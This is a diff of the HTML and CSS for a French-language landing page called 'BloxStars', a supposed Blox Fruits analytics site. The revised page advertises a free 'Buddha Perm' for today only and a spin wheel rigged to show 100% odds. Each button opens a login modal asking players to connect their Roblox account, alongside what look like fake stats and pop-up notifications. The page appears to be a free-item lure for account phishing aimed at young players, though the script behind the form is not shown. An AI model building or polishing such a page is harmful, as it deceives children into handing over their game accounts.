+.slot-display::before{top:0;background:linear-gradient(to bottom,var(--dark),transparent);}
+.slot-display::after{bottom:0;background:linear-gradient(to top,var(--dark),transparent);}
+.slot-reel{
+  display:flex;flex-direction:column;align-items:center;
+  transition:transform 0s;
+}
+.slot-item{
+  height:80px;display:flex;align-items:center;justify-content:center;
+  flex-direction:column;gap:4px;padding:0 20px;
+}
+.slot-item-name{
+  font-family:'Bebas Neue',sans-serif;
+  font-size:22px;letter-spacing:.06em;color:var(--text);
+}
+.slot-item-type{font-size:11px;color:var(--muted);}
+.slot-item.winner .slot-item-name{color:var(--gold);}
+
+.slot-odds{
+  display:flex;flex-direction:column;gap:8px;margin-bottom:20px;
+}
+.odd-row{
+  display:flex;align-items:center;justify-content:space-between;
+  padding:8px 12px;background:rgba(255,255,255,0.03);
+  border-radius:6px;border:1px solid transparent;
+  transition:all .2s;
+}
+.odd-row.active{
+  border-color:rgba(240,180,41,0.3);
+  background:rgba(240,180,41,0.07);
+}
+.odd-name{display:flex;align-items:center;gap:8px;font-size:13px;font-weight:500;}
+.odd-dot{width:8px;height:8px;border-radius:50%;flex-shrink:0;}
+.odd-pct{
+  font-family:'Space Mono',monospace;
+  font-size:11px;color:var(--muted);font-weight:700;
+}
+.odd-pct.highlight{color:var(--gold);}
+
+.spin-btn{
+  width:100%;padding:14px;
+  font-family:'Bebas Neue',sans-serif;
+  font-size:20px;letter-spacing:.1em;
+  background:linear-gradient(135deg,var(--gold),var(--orange));
+  color:#000;border:none;border-radius:6px;cursor:pointer;
+  transition:transform .15s,box-shadow .15s,opacity .2s;
+}
+.spin-btn:hover:not(:disabled){transform:translateY(-2px);box-shadow:0 10px 30px rgba(240,180,41,0.4);}
+.spin-btn:disabled{opacity:.5;cursor:not-allowed;transform:none;}
+
+/* ---- FEATURES ---- */
+.feat-grid{
+  display:grid;grid-template-columns:repeat(3,1fr);
+  gap:1px;margin-top:48px;
+  border:1px solid var(--border);border-radius:8px;
+  overflow:hidden;background:var(--border);
+}
+.feat-card{background:var(--card);padding:28px 24px;transition:background .2s;}
+.feat-card:hover{background:var(--card2);}
+.feat-icon{
+  width:36px;height:36px;background:rgba(240,180,41,0.1);
+  border:1px solid rgba(240,180,41,0.15);border-radius:6px;
+  display:flex;align-items:center;justify-content:center;
+  margin-bottom:14px;color:var(--gold);
+}
+.feat-card h3{
+  font-family:'Bebas Neue',sans-serif;
+  font-size:19px;letter-spacing:.06em;color:var(--text);margin-bottom:6px;
+}
+.feat-card p{font-size:13px;color:var(--muted);line-height:1.65;}
+
+/* ---- CTA ---- */
+.cta-section{
+  position:relative;z-index:1;padding:120px 5%;text-align:center;
+  overflow:hidden;
+}
+.cta-section::before{
+  content:'';position:absolute;top:50%;left:50%;
+  transform:translate(-50%,-50%);
+  width:600px;height:400px;border-radius:50%;
+  background:radial-gradient(ellipse,rgba(240,180,41,0.08) 0%,transparent 70%);
+  pointer-events:none;
+}
+.cta-title{
+  font-family:'Bebas Neue',sans-serif;
+  font-size:clamp(44px,6vw,80px);letter-spacing:.03em;
+  color:var(--text);margin-bottom:16px;
+  position:relative;z-index:1;
+}
+.cta-sub{font-size:15px;color:var(--muted);margin-bottom:36px;position:relative;z-index:1;}
+.cta-btns{display:flex;gap:12px;justify-content:center;position:relative;z-index:1;}
+
+/* ---- FOOTER ---- */
+footer{
+  border-top:1px solid var(--border);
+  padding:28px 5%;position:relative;z-index:1;
+  display:flex;justify-content:space-between;align-items:center;flex-wrap:wrap;gap:12px;
+}
+.foot-logo{font-family:'Bebas Neue',sans-serif;font-size:18px;letter-spacing:.1em;}
+.foot-logo span{color:var(--gold);}
+.foot-links{display:flex;gap:20px;}
+.foot-links a{font-size:12px;color:var(--muted);text-decoration:none;transition:color .15s;}
+.foot-links a:hover{color:var(--text);}
+.foot-copy{font-size:11px;color:var(--muted);font-family:'Space Mono',monospace;}
+
+/* ---- NOTIFICATIONS ---- */
+.notif-container{
+  position:fixed;bottom:24px;left:24px;z-index:400;
+  display:flex;flex-direction:column-reverse;gap:10px;
+  pointer-events:none;
+}
+.notif{
+  background:var(--card);border:1px solid var(--border);
+  border-radius:8px;padding:12px 14px;
+  display:flex;align-items:center;gap:10px;
+  max-width:260px;pointer-events:auto;
+  animation:notifIn .4s cubic-bezier(0.34,1.56,0.64,1) forwards,notifOut .4s ease 4.6s forwards;
+}
+.notif-icon{
+  width:32px;height:32px;border-radius:6px;
+  background:rgba(240,180,41,0.12);
+  display:flex;align-items:center;justify-content:center;
+  font-size:16px;flex-shrink:0;
+}
+.notif-user{font-family:'Space Mono',monospace;font-size:11px;font-weight:700;color:var(--gold);margin-bottom:2px;}
+.notif-msg{font-size:11.5px;color:var(--muted);line-height:1.35;}
+@keyframes notifIn{from{opacity:0;transform:translateX(-24px)}to{opacity:1;transform:none}}
+@keyframes notifOut{from{opacity:1}to{opacity:0;transform:translateX(-20px)}}
+
+/* ---- LOGIN MODAL ---- */
+.overlay{
+  position:fixed;inset:0;z-index:800;
+  background:rgba(0,0,0,0.85);backdrop-filter:blur(16px);
+  display:none;align-items:center;justify-content:center;
+}
+.overlay.open{display:flex;}
+.modal{
+  background:var(--card);
+  border:1px solid var(--border);border-radius:12px;
+  padding:36px;max-width:440px;width:92%;
+  position:relative;
+  box-shadow:0 40px 100px rgba(0,0,0,0.7);
+}
+.modal-close{
+  position:absolute;top:14px;right:16px;
+  background:none;border:none;color:var(--muted);
+  font-size:22px;cursor:pointer;line-height:1;
+  transition:color .15s;
+}
+.modal-close:hover{color:var(--text);}
+.modal-logo{
+  font-family:'Bebas Neue',sans-serif;
+  font-size:18px;letter-spacing:.12em;color:var(--text);margin-bottom:6px;
+}
+.modal-logo span{color:var(--gold);}
+.modal h2{
+  font-family:'Bebas Neue',sans-serif;
+  font-size:28px;letter-spacing:.06em;color:var(--text);margin-bottom:8px;
+}
+.modal-desc{font-size:13.5px;color:var(--muted);line-height:1.6;margin-bottom:20px;}
+.info-box{
+  border-radius:8px;padding:14px;margin-bottom:14px;
+}
+.info-box.gold{background:rgba(240,180,41,0.08);border:1px solid rgba(240,180,41,0.25);}
+.info-box.blue{background:rgba(0,229,255,0.06);border:1px solid rgba(0,229,255,0.2);}
+.info-box h4{
+  font-family:'Space Mono',monospace;
+  font-size:10px;font-weight:700;letter-spacing:.14em;text-transform:uppercase;
+  margin-bottom:6px;
+}
+.info-box.gold h4{color:var(--gold);}
+.info-box.blue h4{color:var(--cyan);}
+.info-box p{font-size:12.5px;color:var(--muted);line-height:1.55;}
+.input-group{margin-bottom:10px;}
+.modal input{
+  width:100%;padding:12px 14px;
+  background:var(--dark);border:1px solid var(--border);
+  border-radius:6px;color:var(--text);font-size:14px;
+  font-family:'DM Sans',sans-serif;
+  outline:none;transition:border-color .15s;
+}
+.modal input::placeholder{color:var(--muted);}
+.modal input:focus{border-color:rgba(240,180,41,0.5);}
+.modal-btn{
+  width:100%;padding:13px;margin-top:4px;
+  font-family:'Bebas Neue',sans-serif;
+  font-size:20px;letter-spacing:.08em;
+  background:linear-gradient(135deg,var(--gold),var(--orange));
+  color:#000;border:none;border-radius:6px;cursor:pointer;
+  transition:transform .15s,box-shadow .15s;
+}
+.modal-btn:hover{transform:translateY(-1px);box-shadow:0 10px 28px rgba(240,180,41,0.4);}
+.modal-fine{font-size:11px;color:var(--muted);text-align:center;margin-top:12px;line-height:1.5;}
+
+/* ---- REWARD OVERLAY ---- */
+.reward-overlay{
+  position:fixed;inset:0;z-index:900;
+  background:rgba(0,0,0,0);backdrop-filter:blur(0px);
+  display:none;align-items:center;justify-content:center;
+  flex-direction:column;
+  transition:background .7s ease,backdrop-filter .7s ease;
+}
+.reward-overlay.open{display:flex;}
+.reward-overlay.show{background:rgba(0,0,0,0.94);backdrop-filter:blur(24px);}
+
+.reward-card{
+  position:relative;z-index:2;
+  opacity:0;transform:scale(.75) translateY(32px);
+  transition:opacity .6s cubic-bezier(0.34,1.56,.64,1) .2s,transform .6s cubic-bezier(0.34,1.56,.64,1) .2s;
+}
+.reward-card.show{opacity:1;transform:scale(1) translateY(0);}
+
+.reward-inner{
+  background:linear-gradient(145deg,#18130a,#201800,#18130a);
+  border:1px solid rgba(240,180,41,0.4);
+  border-radius:20px;padding:40px 44px;
+  text-align:center;max-width:360px;
+  position:relative;overflow:hidden;
+  box-shadow:0 0 100px rgba(240,180,41,0.15),0 40px 80px rgba(0,0,0,0.8);
+}
+.reward-inner::before{
+  content:'';position:absolute;top:0;left:0;right:0;height:1px;
+  background:linear-gradient(90deg,transparent,var(--gold),transparent);
+}
+.reward-inner::after{
+  content:'';position:absolute;inset:0;
+  background:conic-gradient(from 0deg at 50% 50%,transparent 0deg,rgba(240,180,41,0.04) 60deg,transparent 120deg);
+  animation:rotateGlow 5s linear infinite;
+}
+@keyframes rotateGlow{from{transform:rotate(0deg)}to{transform:rotate(360deg)}}
+
+.reward-badge{
+  display:inline-flex;align-items:center;gap:6px;
+  font-family:'Space Mono',monospace;
+  font-size:10px;font-weight:700;letter-spacing:.18em;text-transform:uppercase;
+  background:var(--gold);color:#000;
+  padding:4px 14px;border-radius:2px;margin-bottom:22px;
+  position:relative;z-index:1;
+}
+.reward-fruit-wrap{
+  position:relative;z-index:1;
+  width:140px;height:140px;margin:0 auto 20px;
+}
+.reward-fruit-glow{
+  position:absolute;inset:-24px;
+  background:radial-gradient(circle,rgba(240,180,41,0.35) 0%,transparent 70%);
+  animation:fruitPulse 2.5s ease-in-out infinite;
+}
+@keyframes fruitPulse{0%,100%{transform:scale(1);opacity:1}50%{transform:scale(1.12);opacity:.7}}
+.reward-fruit-img{
+  width:120px;height:120px;
+  object-fit:contain;position:relative;z-index:1;
+  animation:fruitFloat 3.5s ease-in-out infinite;
+  filter:drop-shadow(0 0 24px rgba(240,180,41,0.6));
+}
+@keyframes fruitFloat{0%,100%{transform:translateY(0) rotate(-3deg)}50%{transform:translateY(-10px) rotate(3deg)}}
+.reward-name{
+  font-family:'Bebas Neue',sans-serif;
+  font-size:44px;letter-spacing:.05em;
+  color:var(--gold);line-height:1;
+  text-shadow:0 0 40px rgba(240,180,41,0.5);
+  position:relative;z-index:1;margin-bottom:4px;
+}
+.reward-sub{
+  font-size:13px;color:var(--muted);
+  position:relative;z-index:1;margin-bottom:24px;
+}
+.reward-checks{
+  background:rgba(0,0,0,0.3);border:1px solid rgba(255,255,255,0.06);
+  border-radius:10px;padding:14px 16px;text-align:left;
+  position:relative;z-index:1;margin-bottom:20px;
+}
+.check-row{
+  display:flex;align-items:center;gap:10px;
+  font-size:12.5px;color:var(--muted);padding:3px 0;
+}
+.check-dot{
+  width:18px;height:18px;border-radius:50%;
+  background:rgba(0,255,120,0.12);border:1px solid rgba(0,255,120,0.3);
+  display:flex;align-items:center;justify-content:center;
+  font-size:9px;color:#4ade80;flex-shrink:0;
+}
+.discord-btn{
+  width:100%;padding:13px;
+  background:linear-gradient(135deg,#5865f2,#4752c4);
+  color:#fff;border:none;border-radius:8px;
+  font-family:'Bebas Neue',sans-serif;
+  font-size:18px;letter-spacing:.08em;cursor:pointer;
+  display:flex;align-items:center;justify-content:center;gap:8px;
+  transition:transform .15s,opacity .15s;
+  position:relative;z-index:1;
+}
+.discord-btn:hover{transform:translateY(-1px);opacity:.9;}
+
+/* ---- PARTICLES ---- */
+#particles{position:fixed;inset:0;pointer-events:none;z-index:901;overflow:hidden;}
+
+/* ---- SCROLL REVEAL ---- */
+.rv{opacity:0;transform:translateY(22px);transition:opacity .7s ease,transform .7s ease;}
+.rv.on{opacity:1;transform:none;}
 
 @media(max-width:860px){
-  .hero h1 { font-size:34px; }
-  .story-g,.sc-item,.feat-g { grid-template-columns:1fr; }
-  .sc-item.rev { direction:ltr; }
-  .t-sep { display:none; }
-  .nav-links a:not(.nav-roblox) { display:none; }
-  .foot-in { flex-direction:column; gap:12px; text-align:center; }
-  .notification-container { left:10px; bottom:20px; top:auto; transform:none; max-height:40vh; }
-  .fruit-card { min-width:280px; padding:30px 28px; }
+  h1{font-size:52px;}
+  .who-grid,.spin-wrapper,.feat-grid{grid-template-columns:1fr;}
+  .hero-bg-fruit{display:none;}
+  .hero-glow{display:none;}
+  nav .nav-link{display:none;}
+  footer{flex-direction:column;text-align:center;}
+  .reward-inner{padding:28px 22px;}
+  .notif-container{left:12px;bottom:12px;}
 }
 </style>
 </head>
 <body>
 
-<!-- PARTICLES -->
-<div class="particles-container" id="particlesContainer"></div>
+<div class="cursor" id="cursor"></div>
+<div class="cursor-ring" id="cursorRing"></div>
+<div id="particles"></div>
+<div class="notif-container" id="notifContainer"></div>
 
-<!-- NOTIFICATION CONTAINER -->
-<div class="notification-container" id="notificationContainer"></div>
-
+<!-- NAV -->
 <nav>
-  <div class="wrap nav-inner">
-    <div class="logo" onclick="location.reload()">BLOX<b>STARS</b></div>
-    <div class="nav-links">
-      <a href="#features">Fonctionnalités</a>
-      <a href="#showcase">Vitrine</a>
-      <a href="#how">Comment ça marche</a>
-      <a href="#" class="nav-roblox" onclick="connectRoblox(); return false;">
-        <img src="https://devforum-uploads.s3.dualstack.us-east-2.amazonaws.com/uploads/original/4X/7/3/e/73e99bc29b53d46c53a257709a18fe63361cce23.png" alt="Roblox" style="width:13px;height:13px;object-fit:contain" />
-        Connexion Roblox
-      </a>
-    </div>
+  <div class="nav-logo">BLOX<span>STARS</span></div>
+  <div class="nav-right">
+    <a href="#about" class="nav-link">Qui sommes-nous</a>
+    <a href="#spin" class="nav-link">Roue</a>
+    <a href="#features" class="nav-link">Features</a>
+    <button class="nav-cta" onclick="openLogin()">RÉCLAMER BUDDHA PERM</button>
   </div>
 </nav>
 
-<!-- SPECIAL OFFER BANNER -->
-<div class="offer-banner">
-  <div class="wrap offer-inner">
-    <span class="offer-badge">⚡ Offre Spéciale</span>
-    <span class="offer-text">
-      🔥 <strong>Buddha Perm GRATUIT</strong> pour tout nouveau compte connecté
-      <span> — Offre limitée, seulement aujourd'hui</span>
-    </span>
-    <a href="#" class="offer-btn" onclick="connectRoblox(); return false;">
-      Réclamer maintenant →
-    </a>
-  </div>
+<!-- BANNER -->
+<div class="banner">
+  <span class="banner-pill">⚡ Offre Limitée</span>
+  <span class="banner-text">🔥 <strong>Buddha Perm GRATUIT</strong> pour tout nouveau compte <em>— Seulement aujourd'hui</em></span>
+  <button class="banner-btn" onclick="openLogin()">Réclamer →</button>
 </div>
 
+<!-- HERO -->
 <section class="hero">
-  <div class="wrap">
-    <div class="eyebrow rv">
-      <div class="eyebrow-dot"></div>
-      Analytics Blox Fruits #1
+  <img class="hero-bg-fruit" src="https://i.ibb.co/Nnjvd6rG/71057572-b567-456a-a9e2-964d23602349-Photoroom.png" alt="">
+  <div class="hero-glow"></div>
+  <div class="hero-content">
+    <div class="hero-eyebrow rv">
+      <div class="hero-eyebrow-dot"></div>
+      Plateforme Analytics #1 Blox Fruits
     </div>
-    <h1 class="rv" style="transition-delay:.07s">
-      Sachez <em>exactement</em> où<br>vous améliorer dans Blox Fruits
+    <h1 class="rv" style="transition-delay:.06s">
+      GRIND <span class="gold">PLUS</span><br>
+      <span class="stroke">INTELLIGENT</span>
     </h1>
-    <p class="hero-sub rv" style="transition-delay:.14s">
-      Blox Stars suit chaque fruit, chaque combat, chaque grind — vous donnant de vraies données pour vous entraîner plus intelligemment, pas juste plus dur.
+    <p class="hero-sub rv" style="transition-delay:.12s">
+      BloxStars suit <strong>chaque fruit, chaque combat</strong> et chaque session. Analytics en temps réel, builds communautaires, et ton <strong style="color:var(--gold)">Buddha Perm gratuit</strong> t'attend.
     </p>
-    <div class="hero-btns rv" style="transition-delay:.2s">
-      <a href="#" class="br" onclick="connectRoblox(); return false;">
-        <img src="https://devforum-uploads.s3.dualstack.us-east-2.amazonaws.com/uploads/original/4X/7/3/e/73e99bc29b53d46c53a257709a18fe63361cce23.png" alt="Roblox" style="width:13px;height:13px;object-fit:contain" />
-        Se connecter avec Roblox
-      </a>
-      <a href="#how" class="bs">Voir comment ça marche</a>
+    <div class="hero-btns rv" style="transition-delay:.18s">
+      <button class="btn-primary" onclick="openLogin()">
+        🎁 RÉCLAMER MON BUDDHA PERM
+      </button>
+      <a href="#spin" class="btn-secondary">Voir la roue →</a>
+    </div>
+    <div class="hero-stats rv" style="transition-delay:.28s">
+      <div>
+        <div class="hstat-num" id="stat1">—</div>
+        <div class="hstat-lbl">Joueurs actifs</div>
+      </div>
+      <div>
+        <div class="hstat-num" id="stat2">—</div>
+        <div class="hstat-lbl">Fruits trackés</div>
+      </div>
+      <div>
+        <div class="hstat-num" id="stat3">—</div>
+        <div class="hstat-lbl">Buddha Perms donnés</div>
+      </div>
     </div>
   </div>
 </section>
 
-<div class="trust">
-  <div class="wrap trust-in">
-    <div class="t-item">
-      <div class="t-num loading" id="sp">—</div>
-      <div class="t-lbl">joueurs suivis</div>
+<!-- WHO WE ARE -->
+<section class="section" id="about">
+  <div class="section-tag rv">Qui sommes-nous</div>
+  <div class="section-title rv" style="transition-delay:.05s">UNE ÉQUIPE DE<br>JOUEURS, POUR DES JOUEURS</div>
+  <p class="section-sub rv" style="transition-delay:.1s">BloxStars a été fondé par des passionnés de Blox Fruits qui voulaient des vraies données — pas des estimations. On a construit la plateforme qu'on aurait voulu avoir.</p>
+  <div class="who-grid rv" style="transition-delay:.15s">
+    <div class="who-card">
+      <div class="who-icon">🎮</div>
+      <h3>Des vrais joueurs</h3>
+      <p>Notre équipe joue à Blox Fruits tous les jours. On comprend ce dont vous avez besoin parce qu'on a les mêmes besoins.</p>
     </div>
-    <div class="t-sep"></div>
-    <div class="t-item">
-      <div class="t-num loading" id="ss">—</div>
-      <div class="t-lbl">fruits collectés</div>
+    <div class="who-card">
+      <div class="who-icon">📊</div>
+      <h3>Data obsédés</h3>
+      <p>On a construit le moteur de tracking le plus précis du jeu. Chaque fruit, chaque spawn, chaque stat — tout est enregistré automatiquement.</p>
     </div>
-    <div class="t-sep"></div>
-    <div class="t-item">
-      <div class="t-num loading" id="sh">—</div>
-      <div class="t-lbl">heures de grind enregistrées</div>
+    <div class="who-card">
+      <div class="who-icon">🤝</div>
+      <h3>Communauté first</h3>
+      <p>Plus de 500 joueurs nous font confiance. On lit chaque feedback et on ship des updates chaque semaine basées sur vos retours.</p>
     </div>
-    <div class="t-sep"></div>
-    <div class="t-pill">
-      <svg width="11" height="11" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5"><path d="M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10z"/></svg>
-      Conçu pour Roblox
+    <div class="who-card">
+      <div class="who-icon">🎁</div>
+      <h3>On donne en retour</h3>
+      <p>Le Buddha Perm gratuit c'est notre façon de vous remercier de nous rejoindre. Un cadeau de bienvenue pour chaque nouveau membre.</p>
     </div>
   </div>
-</div>
+</section>
 
-<section class="sec">
-  <div class="wrap">
-    <div class="story-g">
-      <div class="rv">
-        <div class="stag">Conçu différemment</div>
-        <div class="sh">Commencé comme un tracker.<br>Devenu une plateforme.</div>
-        <p class="sp">La communauté Blox Fruits faisait déjà confiance à Blox Stars pour le suivi. C'est maintenant une plateforme complète avec des analytics puissants au-dessus de votre compte Roblox.</p>
-        <div class="story-steps">
-          <div class="step">
-            <div class="step-d"></div>
-            <div class="step-b">
-              <strong>Connectez votre compte Roblox</strong>
-              <span>Connexion OAuth sécurisée sans risque. Vos données restent privées et synchronisées automatiquement.</span>
-            </div>
-          </div>
-          <div class="step">
-            <div class="step-d"></div>
-            <div class="step-b">
-              <strong>Le tracker capture tout automatiquement</strong>
-              <span>Chaque fruit, bounty et raid enregistré sans aucune saisie manuelle. Jouez simplement à Blox Fruits normalement.</span>
-            </div>
-          </div>
-          <div class="step">
-            <div class="step-d"></div>
-            <div class="step-b">
-              <strong>Les analytics vous montrent quoi améliorer</strong>
-              <span>Les notes de benchmark et les données de tendance révèlent exactement quels fruits et builds freinent votre rang.</span>
-            </div>
+<!-- SPIN SECTION -->
+<section class="section spin-section" id="spin">
+  <div class="spin-wrapper">
+    <div class="spin-left">
+      <div class="section-tag rv">Système de roue</div>
+      <div class="section-title rv" style="transition-delay:.05s">TENTE TA<br><span style="color:var(--gold)">CHANCE</span></div>
+      <p class="spin-desc rv" style="transition-delay:.1s">Chaque nouveau compte reçoit un spin gratuit. La roue ne ment pas — <strong style="color:var(--text)">100% de chance d'obtenir Buddha Perm</strong>. On a configuré la roue spécialement pour notre offre de lancement.</p>
+      <p class="spin-desc rv" style="transition-delay:.15s;margin-top:12px;">Connecte ton compte Roblox pour activer ton spin et récupérer ton Buddha Perm instantanément.</p>
+    </div>
+    <div class="rv" style="transition-delay:.1s">
+      <div class="slot-machine">
+        <div class="slot-header">🎰 SPIN GRATUIT — 1 DISPONIBLE</div>
+        <div class="slot-display">
+          <div class="slot-reel" id="slotReel">
+            <div class="slot-item"><span class="slot-item-name">Dragon</span><span class="slot-item-type">Mythique · Zoan</span></div>
+            <div class="slot-item"><span class="slot-item-name">Leopard</span><span class="slot-item-type">Légendaire · Zoan</span></div>
+            <div class="slot-item"><span class="slot-item-name">Venom</span><span class="slot-item-type">Légendaire · Paramecia</span></div>
+            <div class="slot-item winner"><span class="slot-item-name">BUDDHA PERM</span><span class="slot-item-type">★ Garanti · Tier S</span></div>
+            <div class="slot-item"><span class="slot-item-name">Control</span><span class="slot-item-type">Légendaire · Paramecia</span></div>
           </div>
         </div>
-      </div>
-      <div class="rv" style="transition-delay:.1s">
-        <div class="img-wrapper" style="border-radius:14px;box-shadow:0 0 0 1px rgba(255,255,255,0.07),0 30px 70px rgba(0,0,0,0.6);">
-          <div class="skeleton"></div>
-          <img src="https://static.wikia.nocookie.net/roblox-blox-piece/images/7/78/Lightning_Fruit.png/revision/latest?cb=20231027120057" alt="Benchmark" class="story-img" onload="this.classList.add('loaded');this.previousElementSibling.classList.add('hidden');" />
+        <div class="slot-odds">
+          <div class="odd-row" id="odd1">
+            <span class="odd-name"><span class="odd-dot" style="background:#ff6b6b"></span>Dragon / Leopard</span>
+            <span class="odd-pct">0%</span>
+          </div>
+          <div class="odd-row" id="odd2">
+            <span class="odd-name"><span class="odd-dot" style="background:#a78bfa"></span>Autres Légendaires</span>
+            <span class="odd-pct">0%</span>
+          </div>
+          <div class="odd-row active" id="odd3">
+            <span class="odd-name"><span class="odd-dot" style="background:var(--gold)"></span>Buddha Perm</span>
+            <span class="odd-pct highlight">100% ⚡</span>
+          </div>
         </div>
+        <button class="spin-btn" id="spinBtn" onclick="doSpin()">🎰 LANCER LA ROUE</button>
       </div>
     </div>
   </div>
 </section>
 
-<section class="sec" id="features" style="padding-top:0">
-  <div class="wrap">
-    <div class="feat-hd rv">
-      <div class="stag">Fonctionnalités</div>
-      <div class="sh">Tout ce dont vous avez besoin pour grinder avec intention</div>
-      <p class="sp">Pas juste des compteurs de fruits. L'image complète de votre parcours Blox Fruits.</p>
+<!-- FEATURES -->
+<section class="section" id="features">
+  <div class="section-tag rv">Fonctionnalités</div>
+  <div class="section-title rv" style="transition-delay:.05s">TOUT CE QU'IL FAUT<br>POUR DOMINER</div>
+  <div class="feat-grid rv" style="transition-delay:.1s">
+    <div class="feat-card">
+      <div class="feat-icon">
+        <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><polyline points="22 12 18 12 15 21 9 3 6 12 2 12"/></svg>
+      </div>
+      <h3>Tracking en direct</h3>
+      <p>Chaque fruit enregistré automatiquement dès le spawn. Zéro saisie manuelle requise.</p>
     </div>
-    <div class="feat-g rv" style="transition-delay:.08s">
-      <div class="feat">
-        <div class="feat-ic"><svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><polyline points="22 12 18 12 15 21 9 3 6 12 2 12"/></svg></div>
-        <h3>Suivi de Session en Direct</h3>
-        <p>Enregistrement fruit par fruit au moment où vous spawn. Fruits Légendaires, Mythiques et rares suivis automatiquement.</p>
+    <div class="feat-card">
+      <div class="feat-icon">
+        <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><line x1="18" y1="20" x2="18" y2="10"/><line x1="12" y1="20" x2="12" y2="4"/><line x1="6" y1="20" x2="6" y2="14"/></svg>
       </div>
-      <div class="feat">
-        <div class="feat-ic"><svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M12 20h9"/><path d="M16.5 3.5a2.121 2.121 0 0 1 3 3L7 19l-4 1 1-4L16.5 3.5z"/></svg></div>
-        <h3>Benchmark de Fruits</h3>
-        <p>Obtenez une note sur tous les types de fruits. Sachez exactement où vous vous situez parmi la communauté.</p>
-      </div>
-      <div class="feat">
-        <div class="feat-ic"><svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><circle cx="12" cy="12" r="10"/><polyline points="12 6 12 12 16 14"/></svg></div>
-        <h3>Timers de Raid</h3>
-        <p>Horaires de raid structurés avec blocs chronométrés. Les raids se chargent automatiquement au démarrage du timer.</p>
-      </div>
-      <div class="feat">
-        <div class="feat-ic"><svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><line x1="18" y1="20" x2="18" y2="10"/><line x1="12" y1="20" x2="12" y2="4"/><line x1="6" y1="20" x2="6" y2="14"/></svg></div>
-        <h3>Analytics de Progression</h3>
-        <p>Vues de progression, comparaison, heatmap et tendance. Voyez votre trajectoire, pas juste un instantané.</p>
-      </div>
-      <div class="feat">
-        <div class="feat-ic"><svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M17 21v-2a4 4 0 0 0-4-4H5a4 4 0 0 0-4 4v2"/><circle cx="9" cy="7" r="4"/><path d="M23 21v-2a4 4 0 0 0-3-3.87"/><path d="M16 3.13a4 4 0 0 1 0 7.75"/></svg></div>
-        <h3>Builds Communautaires</h3>
-        <p>Parcourez et copiez les builds de fruits d'autres joueurs. Filtrez par niveau et type de fruit.</p>
-      </div>
-      <div class="feat">
-        <div class="feat-ic"><svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><rect x="2" y="3" width="20" height="14" rx="2"/><line x1="8" y1="21" x2="16" y2="21"/><line x1="12" y1="17" x2="12" y2="21"/></svg></div>
-        <h3>Overlay en Jeu</h3>
-        <p>HUD en direct avec les stats de fruits et les timers de raid. Toujours au-dessus, zéro coût de performance.</p>
-      </div>
+      <h3>Analytics avancés</h3>
+      <p>Graphiques de progression, heatmaps et tendances sur toutes tes sessions.</p>
     </div>
-  </div>
-</section>
-
-<section class="sec" id="showcase">
-  <div class="wrap">
-    <div class="sc-item rv">
-      <div class="sc-text">
-        <div class="stag">Benchmark</div>
-        <div class="sh">Votre maîtrise des fruits,<br>détaillée</div>
-        <p class="sp">Lancez le benchmark sur tous les types de fruits et obtenez une note de maîtrise pour chacun. Voyez instantanément vos forces et ce qui vous freine réellement.</p>
+    <div class="feat-card">
+      <div class="feat-icon">
+        <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M17 21v-2a4 4 0 0 0-4-4H5a4 4 0 0 0-4 4v2"/><circle cx="9" cy="7" r="4"/><path d="M23 21v-2a4 4 0 0 0-3-3.87"/><path d="M16 3.13a4 4 0 0 1 0 7.75"/></svg>
       </div>
-      <div class="img-wrapper" style="border-radius:14px;box-shadow:0 0 0 1px rgba(255,255,255,0.07),0 24px 60px rgba(0,0,0,0.55);">
-        <div class="skeleton"></div>
-        <img src="https://static.wikia.nocookie.net/roblox-blox-piece/images/a/a3/Leopard_Fruit.png/revision/latest?cb=20231027115615" alt="Benchmark" class="sc-img" loading="lazy" onload="this.classList.add('loaded');this.previousElementSibling.classList.add('hidden');" />
+      <h3>Builds communautaires</h3>
+      <p>Accède aux meilleurs builds de la communauté, filtrés par rang et type de fruit.</p>
+    </div>
+    <div class="feat-card">
+      <div class="feat-icon">
+        <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><circle cx="12" cy="12" r="10"/><polyline points="12 6 12 12 16 14"/></svg>
       </div>
+      <h3>Timers de raid</h3>
+      <p>Alerts automatiques pour chaque raid. Ne rate plus jamais un spawn rare.</p>
+    </div>
+    <div class="feat-card">
+      <div class="feat-icon">
+        <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M12 20h9"/><path d="M16.5 3.5a2.121 2.121 0 0 1 3 3L7 19l-4 1 1-4L16.5 3.5z"/></svg>
+      </div>
+      <h3>Benchmark fruits</h3>
+      <p>Note de maîtrise sur chaque fruit. Sache exactement sur quoi t'améliorer.</p>
+    </div>
+    <div class="feat-card">
+      <div class="feat-icon">
+        <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><rect x="2" y="3" width="20" height="14" rx="2"/><line x1="8" y1="21" x2="16" y2="21"/><line x1="12" y1="17" x2="12" y2="21"/></svg>
+      </div>
+      <h3>HUD overlay</h3>
+      <p>Stats en temps réel superposées à ton jeu. Zéro lag, toujours visible.</p>
     </div>
   </div>
 </section>
 
-<section class="sec alt">
-  <div class="wrap">
-    <div class="sc-item rev rv">
-      <div class="sc-text">
-        <div class="stag">Stats</div>
-        <div class="sh">Voyez la trajectoire,<br>pas juste le bounty</div>
-        <p class="sp">Suivez les tendances de bounty à travers les sessions avec quatre modes de graphique. Sachez quels fruits s'améliorent et lesquels ont besoin de plus de grind.</p>
-      </div>
-      <div class="img-wrapper" style="border-radius:14px;box-shadow:0 0 0 1px rgba(255,255,255,0.07),0 24px 60px rgba(0,0,0,0.55);">
-        <div class="skeleton"></div>
